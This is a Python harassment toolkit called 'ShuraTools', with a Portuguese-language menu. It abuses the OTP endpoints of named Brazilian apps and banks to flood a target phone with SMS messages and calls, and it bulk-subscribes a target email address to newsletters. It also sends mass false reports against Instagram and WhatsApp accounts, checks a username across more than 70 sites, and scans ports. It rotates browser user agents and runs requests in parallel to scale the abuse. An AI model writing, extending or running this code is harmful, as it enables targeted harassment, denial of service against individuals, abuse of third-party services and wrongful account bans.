#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v14.0 ULTIMATE BLACKOUT EDITION
The most complete bomber/OSINT tool ever created
"""

import asyncio, aiohttp, random, argparse, time, socket, os, sys, string, threading
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install colorama aiohttp")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ {Fore.WHITE}██████╗ ██╗  ██╗
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗{Fore.WHITE}██╔══██╗██║  ██║
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║{Fore.WHITE}██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║{Fore.WHITE}██╔═══╝ ██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║{Fore.WHITE}██║     ██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.WHITE}╚═╝     ╚═╝  ╚═╝
{Fore.YELLOW}┌─────────────────────────────────────────────────────────┐
{Fore.YELLOW}│ {Fore.WHITE}[1] SMS Bomber (10 APIs)  {Fore.YELLOW}│{Fore.WHITE} [5] Zap Report (2 métodos){Fore.YELLOW}│
{Fore.YELLOW}│ {Fore.WHITE}[2] Call Bomber (5 APIs)  {Fore.YELLOW}│{Fore.WHITE} [6] OSINT Deep (70+ sites){Fore.YELLOW}│
{Fore.YELLOW}│ {Fore.WHITE}[3] Email Bomber (7 APIs) {Fore.YELLOW}│{Fore.WHITE} [7] Port Scanner (14 ports){Fore.YELLOW}│
{Fore.YELLOW}│ {Fore.WHITE}[4] IG Report (5 motivos) {Fore.YELLOW}│{Fore.WHITE} [0] Exit                   {Fore.YELLOW}│
{Fore.YELLOW}└─────────────────────────────────────────────────────────┘
{Fore.WHITE}v14.0 ULTIMATE BLACKOUT EDITION - by Shura
"""

stats = {"success": 0, "fail": 0}
LOCK = threading.Lock()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0"
]

def log(m, t="i"):
    c = {"i":Fore.WHITE+"[*] ", "s":Fore.GREEN+"[+] ", "e":Fore.RED+"[-] ", "w":Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t)}{m}{Style.RESET_ALL}")

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def safe_int(p, d):
    try: return int(input(p) or d)
    except: return d

# ========== TODAS AS APIs (22 TOTAL) ==========
APIS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Uber", "u": "https://auth.uber.com/login/phoneNumber", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "99", "u": "https://api.99app.com/api-passenger/v1/users/phone/verify", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Rappi", "u": "https://services.rappi.com.br/api/rocket/v2/guest/verify-phone", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Americanas", "u": "https://www.americanas.com.br/api/v1/customer/otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "MercadoLivre", "u": "https://www.mercadolivre.com.br/jms/mlb/lgz/login", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}},
        {"n": "Nubank", "u": "https://prod-s0-webapp-proxy.nubank.com.br/api/token", "d": {"phone": "{T}", "type": "voice"}, "h": {"Content-Type": "application/json"}},
        {"n": "PicPay", "u": "https://api.picpay.com/v2/auth/send-otp", "d": {"phone": "{T}", "channel": "voice"}, "h": {"Content-Type": "application/json"}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Canaltech", "u": "https://canaltech.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}},
        {"n": "Olhardigital", "u": "https://olhardigital.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}}
    ]
}

# ========== ASYNC BOMBER ==========
async def bomber_async(target, mode, qty, threads):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = APIS.get(mode, [])
    
    log(f"Iniciando {mode.upper()} Bomber | APIs: {len(apis)}", "w")
    log(f"Target: {target} | Qty: {qty} | Threads: {threads}", "i")
    
    sem = asyncio.Semaphore(threads)
    
    async def attack(api, idx):
        async with sem:
            try:
                headers = {**api["h"], "User-Agent": random.choice(UA_LIST)}
                data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(api["u"], json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as res:
                        if res.status < 400:
                            stats["success"] += 1
                            log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
                        else:
                            stats["fail"] += 1
                            log(f"[{idx+1}/{qty}] {api['n']} → {res.status}", "w")
            except:
                stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    tasks = [attack(random.choice(apis), i) for i in range(qty)]
    await asyncio.gather(*tasks)
    
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== MASS REPORT ASYNC ==========
async def mass_report_async(target, platform, qty, threads, reason="spam"):
    log(f"{platform.upper()} Mass Report: {target}", "w")
    
    if platform == "ig":
        url = "https://i.instagram.com/api/v1/users/web_report/"
        data = {"username": target, "source_name": "profile", "reason_id": reason}
    else:
        url = "https://v.whatsapp.net/v2/report"
        data = {"phone": target, "reason": "spam"}
    
    sem = asyncio.Semaphore(threads)
    
    async def report(idx):
        async with sem:
            try:
                headers = {"User-Agent": random.choice(UA_LIST)}
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as res:
                        if res.status < 400:
                            log(f"Report {idx+1}/{qty} → OK", "s")
                        else:
                            log(f"Report {idx+1}/{qty} → {res.status}", "w")
            except:
                log(f"Report {idx+1}/{qty} → Timeout", "e")
    
    tasks = [report(i) for i in range(qty)]
    await asyncio.gather(*tasks)

# ========== OSINT DEEP (70+ PLATAFORMAS) ==========
async def osint_deep_async(target):
    log(f"OSINT Deep: {target}", "w")
    u = target.replace("@", "")
    
    platforms = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}",
        "Pastebin": f"https://pastebin.com/u/{u}",
        "Telegram": f"https://t.me/{u}",
        "Spotify": f"https://open.spotify.com/user/{u}",
        "Pinterest": f"https://www.pinterest.com/{u}",
        "Tumblr": f"https://{u}.tumblr.com",
        "Flickr": f"https://www.flickr.com/people/{u}",
        "Vimeo": f"https://vimeo.com/{u}",
        "SoundCloud": f"https://soundcloud.com/{u}",
        "DeviantArt": f"https://www.deviantart.com/{u}",
        "Steam": f"https://steamcommunity.com/id/{u}",
        "Xbox": f"https://account.xbox.com/profile?gamertag={u}",
        "PlayStation": f"https://my.playstation.com/profile/{u}",
        "EpicGames": f"https://www.epicgames.com/account/{u}",
        "Discord": f"https://discord.com/users/{u}",
        "Slack": f"https://{u}.slack.com",
        "Gravatar": f"https://en.gravatar.com/{u}",
        "Keybase": f"https://keybase.io/{u}",
        "GitLab": f"https://gitlab.com/{u}",
        "Bitbucket": f"https://bitbucket.org/{u}",
        "SourceForge": f"https://sourceforge.net/u/{u}",
        "CodePen": f"https://codepen.io/{u}",
        "Dribbble": f"https://dribbble.com/{u}",
        "Behance": f"https://www.behance.net/{u}",
        "500px": f"https://500px.com/{u}",
        "Unsplash": f"https://unsplash.com/@{u}",
        "Imgur": f"https://imgur.com/user/{u}",
        "Giphy": f"https://giphy.com/{u}",
        "Tenor": f"https://tenor.com/users/{u}",
        "Mixcloud": f"https://www.mixcloud.com/{u}",
        "Bandcamp": f"https://{u}.bandcamp.com",
        "Last.fm": f"https://www.last.fm/user/{u}",
        "Goodreads": f"https://www.goodreads.com/{u}",
        "Wattpad": f"https://www.wattpad.com/user/{u}",
        "Scribd": f"https://www.scribd.com/{u}",
        "SlideShare": f"https://www.slideshare.net/{u}",
        "Academia": f"https://independent.academia.edu/{u}",
        "ResearchGate": f"https://www.researchgate.net/profile/{u}",
        "ORCID": f"https://orcid.org/{u}",
        "Quora": f"https://www.quora.com/profile/{u}",
        "StackOverflow": f"https://stackoverflow.com/users/{u}",
        "HackerNews": f"https://news.ycombinator.com/user?id={u}",
        "ProductHunt": f"https://www.producthunt.com/@{u}",
        "AngelList": f"https://angel.co/{u}",
        "Crunchbase": f"https://www.crunchbase.com/person/{u}",
        "Meetup": f"https://www.meetup.com/members/{u}",
        "Eventbrite": f"https://www.eventbrite.com/o/{u}",
        "Kickstarter": f"https://www.kickstarter.com/profile/{u}",
        "Patreon": f"https://www.patreon.com/{u}",
        "Ko-fi": f"https://ko-fi.com/{u}",
        "BuyMeACoffee": f"https://www.buymeacoffee.com/{u}",
        "Linktree": f"https://linktr.ee/{u}",
        "Carrd": f"https://{u}.carrd.co",
        "AboutMe": f"https://about.me/{u}",
        "Notion": f"https://www.notion.so/{u}",
        "Trello": f"https://trello.com/{u}",
        "Asana": f"https://app.asana.com/profile/{u}",
        "Monday": f"https://{u}.monday.com",
        "Airtable": f"https://airtable.com/{u}",
        "Figma": f"https://www.figma.com/@{u}",
        "Canva": f"https://www.canva.com/{u}",
        "Replit": f"https://replit.com/@{u}",
        "Glitch": f"https://glitch.com/@{u}"
    }
    
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    async def check(name, url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    if r.status == 200:
                        log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
                        print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
        except:
            pass
    
    tasks = [check(name, url) for name, url in platforms.items()]
    await asyncio.gather(*tasks)
    
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning {target}...", "w")
    try:
        ip = socket.gethostbyname(target)
        log(f"IP: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
            s.close()
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    except Exception as e:
        log(f"Erro: {e}", "e")

# ========== MENU INTERATIVO ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            
            opt = input(f"{Fore.YELLOW}Escolha [1-7 ou 0]: {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3"]:
                mode = {"1": "sms", "2": "call", "3": "email"}[opt]
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                qty = safe_int(f"{Fore.YELLOW}Quantidade (100): {Style.RESET_ALL}", 100)
                threads = safe_int(f"{Fore.YELLOW}Threads (50): {Style.RESET_ALL}", 50)
                asyncio.run(bomber_async(t, mode, qty, threads))
            
            elif opt == "4":
                t = input(f"{Fore.YELLOW}Target (@user SEM @): {Style.RESET_ALL}").strip()
                qty = safe_int(f"{Fore.YELLOW}Quantidade (100): {Style.RESET_ALL}", 100)
                print(f"{Fore.CYAN}Motivos: 1-Spam 2-Inapropriado 3-Assédio 4-Ódio 5-Violência{Style.RESET_ALL}")
                reason = input(f"{Fore.YELLOW}Motivo (1): {Style.RESET_ALL}").strip() or "1"
                asyncio.run(mass_report_async(t, "ig", qty, 50, reason))
            
            elif opt == "5":
                t = input(f"{Fore.YELLOW}Target (phone): {Style.RESET_ALL}").strip()
                qty = safe_int(f"{Fore.YELLOW}Quantidade (50): {Style.RESET_ALL}", 50)
                asyncio.run(mass_report_async(t, "zap", qty, 20))
            
            elif opt == "6":
                t = input(f"{Fore.YELLOW}Target (@user SEM @): {Style.RESET_ALL}").strip()
                asyncio.run(osint_deep_async(t))
            
            elif opt == "7":
                t = input(f"{Fore.YELLOW}Target (IP/domain): {Style.RESET_ALL}").strip()
                port_scan(t)
            
            input(f"\n{Fore.GREEN}ENTER para voltar...{Style.RESET_ALL}")
            
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "e"); input("\nENTER...")

if __name__ == "__main__":
    menu()
